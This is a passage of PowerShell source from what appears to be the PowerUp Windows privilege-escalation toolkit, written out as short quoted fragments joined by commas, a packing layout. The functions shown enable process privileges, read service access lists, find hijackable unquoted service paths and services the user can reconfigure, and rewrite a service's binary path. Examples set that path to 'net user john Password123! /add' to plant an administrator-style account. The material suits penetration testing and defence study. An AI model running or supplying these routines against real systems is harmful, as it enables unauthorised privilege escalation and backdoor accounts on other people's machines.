    [Diag','nostics.CodeAn','alysis.Suppres','sMessageAttrib','ute(''PSShouldP','rocess'', '''')]
','    [OutputTyp','e(''PowerUp.Tok','enType'')]
    ','[CmdletBinding','()]
    Param(','
        [Para','meter(Position',' = 0, ValueFro','mPipeline = $T','rue, ValueFrom','PipelineByProp','ertyName = $Tr','ue)]
        [','Alias(''Process','ID'')]
        ','[UInt32]
     ','   [ValidateNo','tNullOrEmpty()',']
        $Id
','    )

    PRO','CESS {
       ',' if ($PSBoundP','arameters[''Id''',']) {
         ','   $ProcessHan','dle = $Kernel3','2::OpenProcess','(0x400, $False',', $Id);$LastEr','ror = [Runtime','.InteropServic','es.Marshal]::G','etLastWin32Err','or()
         ','   if ($Proces','sHandle -eq 0)',' {
           ','     Write-War','ning ([Compone','ntModel.Win32E','xception] $Las','tError)
      ','      }
      ','      else {
 ','              ',' $ProcessID = ','$Id
          ','  }
        }
','        else {','
            #',' open up a pse','udo handle to ','the current pr','ocess- don''t n','eed to worry a','bout closing
 ','           $Pr','ocessHandle = ','$Kernel32::Get','CurrentProcess','()
           ',' $ProcessID = ','$PID
        }','

        if (','$ProcessHandle',') {
          ','  [IntPtr]$hPr','ocToken = [Int','Ptr]::Zero
   ','         $TOKE','N_QUERY = 0x00','08
           ',' $Success = $A','dvapi32::OpenP','rocessToken($P','rocessHandle, ','$TOKEN_QUERY, ','[ref]$hProcTok','en);$LastError',' = [Runtime.In','teropServices.','Marshal]::GetL','astWin32Error(',')

           ',' if ($Success)',' {
           ','     $TokenTyp','e = Get-TokenI','nformation -To','kenHandle $hPr','ocToken -Infor','mationClass ''T','ype''
         ','       $TokenT','ype | ForEach-','Object {
     ','              ',' $_ | Add-Memb','er Notepropert','y ''ProcessId'' ','$ProcessID
   ','              ','   $_
        ','        }
    ','        }
    ','        else {','
             ','   Write-Warni','ng ([Component','Model.Win32Exc','eption] $LastE','rror)
        ','    }

       ','     if ($PSBo','undParameters[','''Id'']) {
     ','           # c','lose the handl','e if we used O','penProcess()
 ','              ',' $Null = $Kern','el32::CloseHan','dle($ProcessHa','ndle)
        ','    }
        ','}
    }
}


fu','nction Enable-','Privilege {
<#','
.SYNOPSIS

En','ables a specif','ic privilege f','or the current',' process.

Aut','hor: Will Schr','oeder (@harmj0','y)  
License: ','BSD 3-Clause  ','
Required Depe','ndencies: PSRe','flect  

.DESC','RIPTION

Uses ','RtlAdjustPrivi','lege to enable',' a specific pr','ivilege for th','e current proc','ess.
Privilege','s can be passe','d by string, o','r the output f','rom Get-Proces','sTokenPrivileg','e
can be passe','d on the pipel','ine.

.EXAMPLE','

Get-ProcessT','okenPrivilege
','
             ','       Privile','ge            ','        Attrib','utes          ','           Pro','cessId
       ','             -','--------      ','              ','----------    ','              ','   ---------
 ','         SeShu','tdownPrivilege','              ','        DISABL','ED            ','              ','3620
      SeC','hangeNotifyPri','vilege ...AULT',', SE_PRIVILEGE','_ENABLED      ','              ','      3620
   ','         SeUnd','ockPrivilege  ','              ','      DISABLED','              ','            36','20
SeIncreaseW','orkingSetPrivi','lege          ','            DI','SABLED        ','              ','    3620
     ','     SeTimeZon','ePrivilege    ','              ','    DISABLED  ','              ','          3620','

Enable-Privi','lege SeShutdow','nPrivilege

Ge','t-ProcessToken','Privilege

   ','              ','   Privilege  ','              ','    Attributes','              ','       Process','Id
           ','         -----','----          ','          ----','------        ','             -','--------
     ','     SeShutdow','nPrivilege    ','      SE_PRIVI','LEGE_ENABLED  ','              ','          3620','
      SeChang','eNotifyPrivile','ge ...AULT, SE','_PRIVILEGE_ENA','BLED          ','              ','  3620
       ','     SeUndockP','rivilege      ','              ','  DISABLED    ','              ','        3620
S','eIncreaseWorki','ngSetPrivilege','              ','        DISABL','ED            ','              ','3620
         ',' SeTimeZonePri','vilege        ','              ','DISABLED      ','              ','      3620

.E','XAMPLE

Get-Pr','ocessTokenPriv','ilege

Privile','ge            ','              ','              ','Attributes    ','              ','   ProcessId
-','--------      ','              ','              ','      --------','--            ','         -----','----
SeShutdow','nPrivilege    ','              ','              ','DISABLED      ','              ','      2828
SeC','hangeNotifyPri','vilege       .','..AULT, SE_PRI','VILEGE_ENABLED','              ','            28','28
SeUndockPri','vilege        ','              ','            DI','SABLED        ','              ','    2828
SeInc','reaseWorkingSe','tPrivilege    ','              ','    DISABLED  ','              ','          2828','
SeTimeZonePri','vilege        ','              ','          DISA','BLED          ','              ','  2828


Get-P','rocessTokenPri','vilege | Enabl','e-Privilege -V','erbose
VERBOSE',': Attempting t','o enable SeShu','tdownPrivilege','
VERBOSE: Atte','mpting to enab','le SeChangeNot','ifyPrivilege
V','ERBOSE: Attemp','ting to enable',' SeUndockPrivi','lege
VERBOSE: ','Attempting to ','enable SeIncre','aseWorkingSetP','rivilege
VERBO','SE: Attempting',' to enable SeT','imeZonePrivile','ge

Get-Proces','sTokenPrivileg','e

Privilege  ','              ','              ','          Attr','ibutes        ','             P','rocessId
-----','----          ','              ','              ','  ----------  ','              ','     ---------','
SeShutdownPri','vilege        ','            SE','_PRIVILEGE_ENA','BLED          ','              ','  2828
SeChang','eNotifyPrivile','ge       ...AU','LT, SE_PRIVILE','GE_ENABLED    ','              ','        2828
S','eUndockPrivile','ge            ','          SE_P','RIVILEGE_ENABL','ED            ','              ','2828
SeIncreas','eWorkingSetPri','vilege        ','  SE_PRIVILEGE','_ENABLED      ','              ','      2828
SeT','imeZonePrivile','ge            ','        SE_PRI','VILEGE_ENABLED','              ','            28','28

.LINK

htt','p://forum.sysi','nternals.com/t','ip-easy-way-to','-enable-privil','eges_topic1574','5.html
#>

   ',' [CmdletBindin','g()]
    Param','(
        [Par','ameter(Positio','n = 0, Mandato','ry = $True, Va','lueFromPipelin','e = $True, Val','ueFromPipeline','ByPropertyName',' = $True)]
   ','     [Alias(''P','rivileges'')]
 ','       [Valida','teSet(''SeCreat','eTokenPrivileg','e'', ''SeAssignP','rimaryTokenPri','vilege'', ''SeLo','ckMemoryPrivil','ege'', ''SeIncre','aseQuotaPrivil','ege'', ''SeUnsol','icitedInputPri','vilege'', ''SeMa','chineAccountPr','ivilege'', ''SeT','cbPrivilege'', ','''SeSecurityPri','vilege'', ''SeTa','keOwnershipPri','vilege'', ''SeLo','adDriverPrivil','ege'', ''SeSyste','mProfilePrivil','ege'', ''SeSyste','mtimePrivilege',''', ''SeProfileS','ingleProcessPr','ivilege'', ''SeI','ncreaseBasePri','orityPrivilege',''', ''SeCreatePa','gefilePrivileg','e'', ''SeCreateP','ermanentPrivil','ege'', ''SeBacku','pPrivilege'', ''','SeRestorePrivi','lege'', ''SeShut','downPrivilege''',', ''SeDebugPriv','ilege'', ''SeAud','itPrivilege'', ','''SeSystemEnvir','onmentPrivileg','e'', ''SeChangeN','otifyPrivilege',''', ''SeRemoteSh','utdownPrivileg','e'', ''SeUndockP','rivilege'', ''Se','SyncAgentPrivi','lege'', ''SeEnab','leDelegationPr','ivilege'', ''SeM','anageVolumePri','vilege'', ''SeIm','personatePrivi','lege'', ''SeCrea','teGlobalPrivil','ege'', ''SeTrust','edCredManAcces','sPrivilege'', ''','SeRelabelPrivi','lege'', ''SeIncr','easeWorkingSet','Privilege'', ''S','eTimeZonePrivi','lege'', ''SeCrea','teSymbolicLink','Privilege'')]
 ','       [String','[]]
        $P','rivilege
    )','

    PROCESS ','{
        ForE','ach ($Priv in ','$Privilege) {
','            [U','Int32]$Previou','sState = 0
   ','         Write','-Verbose "Atte','mpting to enab','le $Priv"
    ','        $Succe','ss = $NTDll::R','tlAdjustPrivil','ege($SecurityE','ntity::$Priv, ','$True, $False,',' [ref]$Previou','sState)
      ','      if ($Suc','cess -ne 0) {
','              ','  Write-Warnin','g "RtlAdjustPr','ivilege for $P','riv failed: $S','uccess"
      ','      }
      ','  }
    }
}


','function Add-S','erviceDacl {
<','#
.SYNOPSIS

A','dds a Dacl fie','ld to a servic','e object retur','ned by Get-Ser','vice.

Author:',' Matthew Graeb','er (@mattifest','ation)  
Licen','se: BSD 3-Clau','se  
Required ','Dependencies: ','PSReflect  

.','DESCRIPTION

T','akes one or mo','re ServiceProc','ess.ServiceCon','troller object','s on the pipel','ine and adds a','
Dacl field to',' each object. ','It does this b','y opening a ha','ndle with Read','Control for th','e
service with',' using the Get','ServiceHandle ','Win32 API call',' and then uses','
QueryServiceO','bjectSecurity ','to retrieve a ','copy of the se','curity descrip','tor for the se','rvice.

.PARAM','ETER Name

An ','array of one o','r more service',' names to add ','a service Dacl',' for. Passable',' on the pipeli','ne.

.EXAMPLE
','
Get-Service |',' Add-ServiceDa','cl

Add Dacls ','for every serv','ice the curren','t user can rea','d.

.EXAMPLE

','Get-Service -N','ame VMTools | ','Add-ServiceDac','l

Add the Dac','l to the VMToo','ls service obj','ect.

.OUTPUTS','

ServiceProce','ss.ServiceCont','roller

.LINK
','
https://rohns','powershellblog','.wordpress.com','/2013/03/19/vi','ewing-service-','acls/
#>

    ','[Diagnostics.C','odeAnalysis.Su','ppressMessageA','ttribute(''PSSh','ouldProcess'', ',''''')]
    [Outp','utType(''Servic','eProcess.Servi','ceController'')',']
    [CmdletB','inding()]
    ','Param(
       ',' [Parameter(Po','sition = 0, Ma','ndatory = $Tru','e, ValueFromPi','peline = $True',', ValueFromPip','elineByPropert','yName = $True)',']
        [Ali','as(''ServiceNam','e'')]
        [','String[]]
    ','    [ValidateN','otNullOrEmpty(',')]
        $Na','me
    )

    ','BEGIN {
      ','  filter Local',':Get-ServiceRe','adControlHandl','e {
          ','  [OutputType(','[IntPtr])]
   ','         Param','(
            ','    [Parameter','(Mandatory = $','True, ValueFro','mPipeline = $T','rue)]
        ','        [Valid','ateNotNullOrEm','pty()]
       ','         [Vali','dateScript({ $','_ -as ''Service','Process.Servic','eController'' }',')]
           ','     $Service
','            )
','
            $','GetServiceHand','le = [ServiceP','rocess.Service','Controller].Ge','tMethod(''GetSe','rviceHandle'', ','[Reflection.Bi','ndingFlags] ''I','nstance, NonPu','blic'')
       ','     $ReadCont','rol = 0x000200','00
           ',' $RawHandle = ','$GetServiceHan','dle.Invoke($Se','rvice, @($Read','Control))
    ','        $RawHa','ndle
        }','
    }

    PR','OCESS {
      ','  ForEach($Ser','viceName in $N','ame) {

      ','      $Individ','ualService = G','et-Service -Na','me $ServiceNam','e -ErrorAction',' Stop

       ','     try {
   ','             W','rite-Verbose "','Add-ServiceDac','l IndividualSe','rvice : $($Ind','ividualService','.Name)"
      ','          $Ser','viceHandle = G','et-ServiceRead','ControlHandle ','-Service $Indi','vidualService
','            }
','            ca','tch {
        ','        $Servi','ceHandle = $Nu','ll
           ','     Write-Ver','bose "Error op','ening up the s','ervice handle ','with read cont','rol for $($Ind','ividualService','.Name) : $_"
 ','           }

','            if',' ($ServiceHand','le -and ($Serv','iceHandle -ne ','[IntPtr]::Zero',')) {
         ','       $SizeNe','eded = 0

    ','            $R','esult = $Advap','i32::QueryServ','iceObjectSecur','ity($ServiceHa','ndle, [Securit','y.AccessContro','l.SecurityInfo','s]::Discretion','aryAcl, @(), 0',', [Ref] $SizeN','eeded);$LastEr','ror = [Runtime','.InteropServic','es.Marshal]::G','etLastWin32Err','or()

        ','        # 122 ','== The data ar','ea passed to a',' system call i','s too small
  ','              ','if ((-not $Res','ult) -and ($La','stError -eq 12','2) -and ($Size','Needed -gt 0))',' {
           ','         $Bina','rySecurityDesc','riptor = New-O','bject Byte[]($','SizeNeeded)

 ','              ','     $Result =',' $Advapi32::Qu','eryServiceObje','ctSecurity($Se','rviceHandle, [','Security.Acces','sControl.Secur','ityInfos]::Dis','cretionaryAcl,',' $BinarySecuri','tyDescriptor, ','$BinarySecurit','yDescriptor.Co','unt, [Ref] $Si','zeNeeded);$Las','tError = [Runt','ime.InteropSer','vices.Marshal]','::GetLastWin32','Error()

     ','              ',' if (-not $Res','ult) {
       ','              ','   Write-Error',' ([ComponentMo','del.Win32Excep','tion] $LastErr','or)
          ','          }
  ','              ','    else {
   ','              ','       $RawSec','urityDescripto','r = New-Object',' Security.Acce','ssControl.RawS','ecurityDescrip','tor -ArgumentL','ist $BinarySec','urityDescripto','r, 0
         ','              ',' $Dacl = $RawS','ecurityDescrip','tor.Discretion','aryAcl | ForEa','ch-Object {
  ','              ','            Ad','d-Member -Inpu','tObject $_ -Me','mberType NoteP','roperty -Name ','AccessRights -','Value ($_.Acce','ssMask -as $Se','rviceAccessRig','hts) -PassThru','
             ','           }
 ','              ','         Add-M','ember -InputOb','ject $Individu','alService -Mem','berType NotePr','operty -Name D','acl -Value $Da','cl -PassThru
 ','              ','     }
       ','         }
   ','             e','lse {
        ','            Wr','ite-Error ([Co','mponentModel.W','in32Exception]',' $LastError)
 ','              ',' }
           ','     $Null = $','Advapi32::Clos','eServiceHandle','($ServiceHandl','e)
           ',' }
        }
 ','   }
}


funct','ion Set-Servic','eBinaryPath {
','<#
.SYNOPSIS

','Sets the binar','y path for a s','ervice to a sp','ecified value.','

Author: Will',' Schroeder (@h','armj0y), Matth','ew Graeber (@m','attifestation)','  
License: BS','D 3-Clause  
R','equired Depend','encies: PSRefl','ect  

.DESCRI','PTION

Takes a',' service Name ','or a ServicePr','ocess.ServiceC','ontroller on t','he pipeline an','d first opens ','up a
service h','andle to the s','ervice with Co','nfigControl ac','cess using the',' GetServiceHan','dle
Win32 API ','call. ChangeSe','rviceConfig is',' then used to ','set the binary',' path (lpBinar','yPathName/binP','ath)
to the st','ring value spe','cified by binP','ath, and the h','andle is close','d off.

Takes ','one or more Se','rviceProcess.S','erviceControll','er objects on ','the pipeline a','nd adds a
Dacl',' field to each',' object. It do','es this by ope','ning a handle ','with ReadContr','ol for the
ser','vice with usin','g the GetServi','ceHandle Win32',' API call and ','then uses
Quer','yServiceObject','Security to re','trieve a copy ','of the securit','y descriptor f','or the service','.

.PARAMETER ','Name

An array',' of one or mor','e service name','s to set the b','inary path for','. Required.

.','PARAMETER Path','

The new bina','ry path (lpBin','aryPathName) t','o set for the ','specified serv','ice. Required.','

.EXAMPLE

Se','t-ServiceBinar','yPath -Name Vu','lnSvc -Path ''n','et user john P','assword123! /a','dd''

Sets the ','binary path fo','r ''VulnSvc'' to',' be a command ','to add a user.','

.EXAMPLE

Ge','t-Service Vuln','Svc | Set-Serv','iceBinaryPath ','-Path ''net use','r john Passwor','d123! /add''

S','ets the binary',' path for ''Vul','nSvc'' to be a ','command to add',' a user.

.OUT','PUTS

System.B','oolean

$True ','if configurati','on succeeds, $','False otherwis','e.

.LINK

htt','ps://msdn.micr','osoft.com/en-u','s/library/wind','ows/desktop/ms','681987(v=vs.85',').aspx
#>

   ',' [Diagnostics.','CodeAnalysis.S','uppressMessage','Attribute(''PSU','seShouldProces','sForStateChang','ingFunctions'',',' '''')]
    [Out','putType(''Syste','m.Boolean'')]
 ','   [CmdletBind','ing()]
    Par','am(
        [P','arameter(Posit','ion = 0, Manda','tory = $True, ','ValueFromPipel','ine = $True, V','alueFromPipeli','neByPropertyNa','me = $True)]
 ','       [Alias(','''ServiceName'')',']
        [Str','ing[]]
       ',' [ValidateNotN','ullOrEmpty()]
','        $Name,','

        [Par','ameter(Positio','n=1, Mandatory',' = $True)]
   ','     [Alias(''B','inaryPath'', ''b','inPath'')]
    ','    [String]
 ','       [Valida','teNotNullOrEmp','ty()]
        ','$Path
    )

 ','   BEGIN {
   ','     filter Lo','cal:Get-Servic','eConfigControl','Handle {
     ','       [Output','Type([IntPtr])',']
            ','Param(
       ','         [Para','meter(Mandator','y = $True, Val','ueFromPipeline',' = $True)]
   ','             [','ServiceProcess','.ServiceContro','ller]
        ','        [Valid','ateNotNullOrEm','pty()]
       ','         $Targ','etService
    ','        )
    ','        $GetSe','rviceHandle = ','[ServiceProces','s.ServiceContr','oller].GetMeth','od(''GetService','Handle'', [Refl','ection.Binding','Flags] ''Instan','ce, NonPublic''',')
            ','$ConfigControl',' = 0x00000002
','            $R','awHandle = $Ge','tServiceHandle','.Invoke($Targe','tService, @($C','onfigControl))','
            $','RawHandle
    ','    }
    }

 ','   PROCESS {

','        ForEac','h($IndividualS','ervice in $Nam','e) {

        ','    $TargetSer','vice = Get-Ser','vice -Name $In','dividualServic','e -ErrorAction',' Stop
        ','    try {
    ','            $S','erviceHandle =',' Get-ServiceCo','nfigControlHan','dle -TargetSer','vice $TargetSe','rvice
        ','    }
        ','    catch {
  ','              ','$ServiceHandle',' = $Null
     ','           Wri','te-Verbose "Er','ror opening up',' the service h','andle with rea','d control for ','$IndividualSer','vice : $_"
   ','         }

  ','          if (','$ServiceHandle',' -and ($Servic','eHandle -ne [I','ntPtr]::Zero))',' {

          ','      $SERVICE','_NO_CHANGE = [','UInt32]::MaxVa','lue
          ','      $Result ','= $Advapi32::C','hangeServiceCo','nfig($ServiceH','andle, $SERVIC','E_NO_CHANGE, $','SERVICE_NO_CHA','NGE, $SERVICE_','NO_CHANGE, "$P','ath", [IntPtr]','::Zero, [IntPt','r]::Zero, [Int','Ptr]::Zero, [I','ntPtr]::Zero, ','[IntPtr]::Zero',', [IntPtr]::Ze','ro);$LastError',' = [Runtime.In','teropServices.','Marshal]::GetL','astWin32Error(',')

           ','     if ($Resu','lt -ne 0) {
  ','              ','    Write-Verb','ose "binPath f','or $Individual','Service succes','sfully set to ','''$Path''"
     ','              ',' $True
       ','         }
   ','             e','lse {
        ','            Wr','ite-Error ([Co','mponentModel.W','in32Exception]',' $LastError)
 ','              ','     $Null
   ','             }','

            ','    $Null = $A','dvapi32::Close','ServiceHandle(','$ServiceHandle',')
            ','}
        }
  ','  }
}


functi','on Test-Servic','eDaclPermissio','n {
<#
.SYNOPS','IS

Tests one ','or more passed',' services or s','ervice names a','gainst a given',' permission se','t,
returning t','he service obj','ects where the',' current user ','have the speci','fied permissio','ns.

Author: W','ill Schroeder ','(@harmj0y), Ma','tthew Graeber ','(@mattifestati','on)  
License:',' BSD 3-Clause ',' 
Required Dep','endencies: Add','-ServiceDacl  ','

.DESCRIPTION','

Takes a serv','ice Name or a ','ServiceProcess','.ServiceContro','ller on the pi','peline, and fi','rst adds
a ser','vice Dacl to t','he service obj','ect with Add-S','erviceDacl. Al','l group SIDs f','or the current','
user are enum','erated service','s where the us','er has some ty','pe of permissi','on are filtere','d. The
service','s are then fil','tered against ','a specified se','t of permissio','ns, and servic','es where the
c','urrent user ha','ve the specifi','ed permissions',' are returned.','

.PARAMETER N','ame

An array ','of one or more',' service names',' to test again','st the specifi','ed permission ','set.

.PARAMET','ER Permissions','

A manual set',' of permission',' to test again','. One of:''Quer','yConfig'', ''Cha','ngeConfig'', ''Q','ueryStatus'',
''','EnumerateDepen','dents'', ''Start',''', ''Stop'', ''Pa','useContinue'', ','''Interrogate'',',' UserDefinedCo','ntrol'',
''Delet','e'', ''ReadContr','ol'', ''WriteDac',''', ''WriteOwner',''', ''Synchroniz','e'', ''AccessSys','temSecurity'',
','''GenericAll'', ','''GenericExecut','e'', ''GenericWr','ite'', ''Generic','Read'', ''AllAcc','ess''

.PARAMET','ER PermissionS','et

A pre-defi','ned permission',' set to test a',' specified ser','vice against. ','''ChangeConfig''',', ''Restart'', o','r ''AllAccess''.','

.EXAMPLE

Ge','t-Service | Te','st-ServiceDacl','Permission

Re','turn all servi','ce objects whe','re the current',' user can modi','fy the service',' configuration','.

.EXAMPLE

G','et-Service | T','est-ServiceDac','lPermission -P','ermissionSet ''','Restart''

Retu','rn all service',' objects that ','the current us','er can restart','.

.EXAMPLE

T','est-ServiceDac','lPermission -P','ermissions ''St','art'' -Name ''Vu','lnSVC''

Return',' the VulnSVC o','bject if the c','urrent user ha','s start permis','sions.

.OUTPU','TS

ServicePro','cess.ServiceCo','ntroller

.LIN','K

https://roh','nspowershellbl','og.wordpress.c','om/2013/03/19/','viewing-servic','e-acls/
#>

  ','  [Diagnostics','.CodeAnalysis.','SuppressMessag','eAttribute(''PS','ShouldProcess''',', '''')]
    [Ou','tputType(''Serv','iceProcess.Ser','viceController',''')]
    [Cmdle','tBinding()]
  ','  Param(
     ','   [Parameter(','Position = 0, ','Mandatory = $T','rue, ValueFrom','Pipeline = $Tr','ue, ValueFromP','ipelineByPrope','rtyName = $Tru','e)]
        [A','lias(''ServiceN','ame'', ''Service',''')]
        [S','tring[]]
     ','   [ValidateNo','tNullOrEmpty()',']
        $Nam','e,

        [S','tring[]]
     ','   [ValidateSe','t(''QueryConfig',''', ''ChangeConf','ig'', ''QuerySta','tus'', ''Enumera','teDependents'',',' ''Start'', ''Sto','p'', ''PauseCont','inue'', ''Interr','ogate'', ''UserD','efinedControl''',', ''Delete'', ''R','eadControl'', ''','WriteDac'', ''Wr','iteOwner'', ''Sy','nchronize'', ''A','ccessSystemSec','urity'', ''Gener','icAll'', ''Gener','icExecute'', ''G','enericWrite'', ','''GenericRead'',',' ''AllAccess'')]','
        $Perm','issions,

    ','    [String]
 ','       [Valida','teSet(''ChangeC','onfig'', ''Resta','rt'', ''AllAcces','s'')]
        $','PermissionSet ','= ''ChangeConfi','g''
    )

    ','BEGIN {
      ','  $AccessMask ','= @{
         ','   ''QueryConfi','g''           =',' [uint32]''0x00','000001''
      ','      ''ChangeC','onfig''        ','  = [uint32]''0','x00000002''
   ','         ''Quer','yStatus''      ','     = [uint32',']''0x00000004''
','            ''E','numerateDepend','ents''   = [uin','t32]''0x0000000','8''
           ',' ''Start''      ','           = [','uint32]''0x0000','0010''
        ','    ''Stop''    ','              ','= [uint32]''0x0','0000020''
     ','       ''PauseC','ontinue''      ','   = [uint32]''','0x00000040''
  ','          ''Int','errogate''     ','      = [uint3','2]''0x00000080''','
            ''','UserDefinedCon','trol''    = [ui','nt32]''0x000001','00''
          ','  ''Delete''    ','            = ','[uint32]''0x000','10000''
       ','     ''ReadCont','rol''          ',' = [uint32]''0x','00020000''
    ','        ''Write','Dac''          ','    = [uint32]','''0x00040000''
 ','           ''Wr','iteOwner''     ','       = [uint','32]''0x00080000','''
            ','''Synchronize'' ','          = [u','int32]''0x00100','000''
         ','   ''AccessSyst','emSecurity''  =',' [uint32]''0x01','000000''
      ','      ''Generic','All''          ','  = [uint32]''0','x10000000''
   ','         ''Gene','ricExecute''   ','     = [uint32',']''0x20000000''
','            ''G','enericWrite''  ','        = [uin','t32]''0x4000000','0''
           ',' ''GenericRead''','           = [','uint32]''0x8000','0000''
        ','    ''AllAccess','''             ','= [uint32]''0x0','00F01FF''
     ','   }

        ','$CheckAllPermi','ssionsInSet = ','$False

      ','  if ($PSBound','Parameters[''Pe','rmissions'']) {','
            $','TargetPermissi','ons = $Permiss','ions
        }','
        else ','{
            ','if ($Permissio','nSet -eq ''Chan','geConfig'') {
 ','              ',' $TargetPermis','sions = @(''Cha','ngeConfig'', ''W','riteDac'', ''Wri','teOwner'', ''Gen','ericAll'', '' Ge','nericWrite'', ''','AllAccess'')
  ','          }
  ','          else','if ($Permissio','nSet -eq ''Rest','art'') {
      ','          $Tar','getPermissions',' = @(''Start'', ','''Stop'')
      ','          $Che','ckAllPermissio','nsInSet = $Tru','e # so we chec','k all permissi','ons && style
 ','           }
 ','           els','eif ($Permissi','onSet -eq ''All','Access'') {
   ','             $','TargetPermissi','ons = @(''Gener','icAll'', ''AllAc','cess'')
       ','     }
       ',' }
    }

    ','PROCESS {

   ','     ForEach($','IndividualServ','ice in $Name) ','{

           ',' $TargetServic','e = $Individua','lService | Add','-ServiceDacl

','            if',' ($TargetServi','ce -and $Targe','tService.Dacl)',' {

          ','      # enumer','ate all group ','SIDs the curre','nt user is a p','art of
       ','         $User','Identity = [Sy','stem.Security.','Principal.Wind','owsIdentity]::','GetCurrent()
 ','              ',' $CurrentUserS','ids = $UserIde','ntity.Groups |',' Select-Object',' -ExpandProper','ty Value
     ','           $Cu','rrentUserSids ','+= $UserIdenti','ty.User.Value
','
             ','   ForEach($Se','rviceDacl in $','TargetService.','Dacl) {
      ','              ','if ($CurrentUs','erSids -contai','ns $ServiceDac','l.SecurityIden','tifier) {

   ','              ','       if ($Ch','eckAllPermissi','onsInSet) {
  ','              ','            $A','llMatched = $T','rue
          ','              ','    ForEach($T','argetPermissio','n in $TargetPe','rmissions) {
 ','              ','              ','   # check per','missions && st','yle
          ','              ','        if (($','ServiceDacl.Ac','cessRights -ba','nd $AccessMask','[$TargetPermis','sion]) -ne $Ac','cessMask[$Targ','etPermission])',' {
           ','              ','           # W','rite-Verbose "','Current user d','oesn''t have ''$','TargetPermissi','on'' for $($Tar','getService.Nam','e)"
          ','              ','            $A','llMatched = $F','alse
         ','              ','             b','reak
         ','              ','         }
   ','              ','           }
 ','              ','             i','f ($AllMatched',') {
          ','              ','        $Targe','tService
     ','              ','         }
   ','              ','       }
     ','              ','     else {
  ','              ','            Fo','rEach($TargetP','ermission in $','TargetPermissi','ons) {
       ','              ','           # c','heck permissio','ns || style
  ','              ','              ','  if (($Servic','eDacl.AceType ','-eq ''AccessAll','owed'') -and ($','ServiceDacl.Ac','cessRights -ba','nd $AccessMask','[$TargetPermis','sion]) -eq $Ac','cessMask[$Targ','etPermission])',' {
           ','              ','           Wri','te-Verbose "Cu','rrent user has',' ''$TargetPermi','ssion'' for $In','dividualServic','e"
           ','              ','           $Ta','rgetService
  ','              ','              ','      break
  ','              ','              ','  }
          ','              ','    }
        ','              ','  }
          ','          }
  ','              ','}
            ','}
            ','else {
       ','         Write','-Verbose "Erro','r enumerating ','the Dacl for s','ervice $Indivi','dualService"
 ','           }
 ','       }
    }','
}


#########','##############','##############','##############','#####
#
# Serv','ice enumeratio','n
#
##########','##############','##############','##############','####

function',' Get-UnquotedS','ervice {
<#
.S','YNOPSIS

Retur','ns the name an','d binary path ','for services w','ith unquoted p','aths
that also',' have a space ','in the name.

','Author: Will S','chroeder (@har','mj0y)  
Licens','e: BSD 3-Claus','e  
Required D','ependencies: G','et-ModifiableP','ath, Test-Serv','iceDaclPermiss','ion  

.DESCRI','PTION

Uses Ge','t-WmiObject to',' query all win','32_service obj','ects and extra','ct out
the bin','ary pathname f','or each. Then ','checks if any ','binary paths h','ave a space
an','d aren''t quote','d.

.EXAMPLE

','Get-UnquotedSe','rvice

Get a s','et of potentia','lly exploitabl','e services.

.','OUTPUTS

Power','Up.UnquotedSer','vice

.LINK

h','ttps://github.','com/rapid7/met','asploit-framew','ork/blob/maste','r/modules/expl','oits/windows/l','ocal/trusted_s','ervice_path.rb','
#>

    [Diag','nostics.CodeAn','alysis.Suppres','sMessageAttrib','ute(''PSShouldP','rocess'', '''')]
','    [OutputTyp','e(''PowerUp.Unq','uotedService'')',']
    [CmdletB','inding()]
    ','Param()

    #',' find all path','s to service .','exe''s that hav','e a space in t','he path and ar','en''t quoted
  ','  $VulnService','s = Get-WmiObj','ect -Class win','32_service | W','here-Object {
','        $_ -an','d ($Null -ne $','_.pathname) -a','nd ($_.pathnam','e.Trim() -ne ''',''') -and (-not ','$_.pathname.St','artsWith("`"")',') -and (-not $','_.pathname.Sta','rtsWith("''")) ','-and ($_.pathn','ame.Substring(','0, $_.pathname','.ToLower().Ind','exOf(''.exe'') +',' 4)) -match ''.','* .*''
    }

 ','   if ($VulnSe','rvices) {
    ','    ForEach ($','Service in $Vu','lnServices) {
','
            $','SplitPathArray',' = $Service.pa','thname.Split(''',' '')
          ','  $ConcatPathA','rray = @()
   ','         for (','$i=0;$i -lt $S','plitPathArray.','Count; $i++) {','
             ','           $Co','ncatPathArray ','+= $SplitPathA','rray[0..$i] -j','oin '' ''
      ','      }

     ','       $Modifi','ableFiles = $C','oncatPathArray',' | Get-Modifia','blePath

     ','       $Modifi','ableFiles | Wh','ere-Object {$_',' -and $_.Modif','iablePath -and',' ($_.Modifiabl','ePath -ne '''')}',' | Foreach-Obj','ect {
        ','        $CanRe','start = Test-S','erviceDaclPerm','ission -Permis','sionSet ''Resta','rt'' -Name $Ser','vice.name
    ','            $O','ut = New-Objec','t PSObject
   ','             $','Out | Add-Memb','er Notepropert','y ''ServiceName',''' $Service.nam','e
            ','    $Out | Add','-Member Notepr','operty ''Path'' ','$Service.pathn','ame
          ','      $Out | A','dd-Member Note','property ''Modi','fiablePath'' $_','
             ','   $Out | Add-','Member Notepro','perty ''StartNa','me'' $Service.s','tartname
     ','           $Ou','t | Add-Member',' Noteproperty ','''AbuseFunction',''' "Write-Servi','ceBinary -Name',' ''$($Service.n','ame)'' -Path <H','ijackPath>"
  ','              ','$Out | Add-Mem','ber Noteproper','ty ''CanRestart',''' ([Bool]$CanR','estart)
      ','          $Out',' | Add-Member ','Aliasproperty ','Name ServiceNa','me
           ','     $Out.PSOb','ject.TypeNames','.Insert(0, ''Po','werUp.Unquoted','Service'')
    ','            $O','ut
           ',' }
        }
 ','   }
}


funct','ion Get-Modifi','ableServiceFil','e {
<#
.SYNOPS','IS

Enumerates',' all services ','and returns vu','lnerable servi','ce files.

Aut','hor: Will Schr','oeder (@harmj0','y)  
License: ','BSD 3-Clause  ','
Required Depe','ndencies: Test','-ServiceDaclPe','rmission, Get-','ModifiablePath','  

.DESCRIPTI','ON

Enumerates',' all services ','by querying th','e WMI win32_se','rvice class. F','or each servic','e,
it takes th','e pathname (ak','a binPath) and',' passes it to ','Get-Modifiable','Path to determ','ine
if the cur','rent user has ','rights to modi','fy the service',' binary itself',' or any associ','ated
arguments','. If the assoc','iated binary (','or any configu','ration files) ','can be overwri','tten,
privileg','es may be able',' to be escalat','ed.

.EXAMPLE
','
Get-Modifiabl','eServiceFile

','Get a set of p','otentially exp','loitable servi','ce binares/con','fig files.

.O','UTPUTS

PowerU','p.ModifiablePa','th
#>

    [Di','agnostics.Code','Analysis.Suppr','essMessageAttr','ibute(''PSShoul','dProcess'', '''')',']
    [OutputT','ype(''PowerUp.M','odifiableServi','ceFile'')]
    ','[CmdletBinding','()]
    Param(',')

